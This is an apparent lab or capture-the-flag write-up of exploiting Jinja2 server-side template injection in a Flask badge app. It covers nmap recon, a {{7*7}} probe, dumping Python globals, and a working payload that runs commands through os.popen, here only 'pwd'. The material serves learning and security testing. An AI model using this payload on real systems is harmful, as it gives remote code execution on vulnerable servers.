# SSTI — Server-Side Template Injection → RCE

## Target
10.1.82.253

## Objective
Exploit a Jinja2 SSTI vulnerability in a Flask badge generator app to achieve RCE and execute the command `pwd`.

## Recon
nmap --top-ports 1000 10.1.82.253

Open ports:
- 22/tcp (SSH)
- 80/tcp (HTTP)

Web app: Flask-based badge preview system.

## Step 1 — Confirm SSTI

Input:
{{7*7}}

Observed output:
49

Interpretation:
User input is rendered directly inside a Jinja2 template.

## Step 2 — Access Python Globals

Input:
{{ self.__init__.__globals__ }}

Observed:
Full globals dictionary containing:
- __builtins__
- __import__
- os module access potential

This confirms template context allows access to Python internals.

## Step 3 — Achieve RCE

Payload:
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('pwd').read() }}

Observed output:
/home/ubuntu

## Result / Answer
The output of the command `pwd` is:

/home/ubuntu

## Conclusion
The application fails to sanitize template input.
Direct template rendering allows access to Python internals.
Full RCE achieved via os.popen().
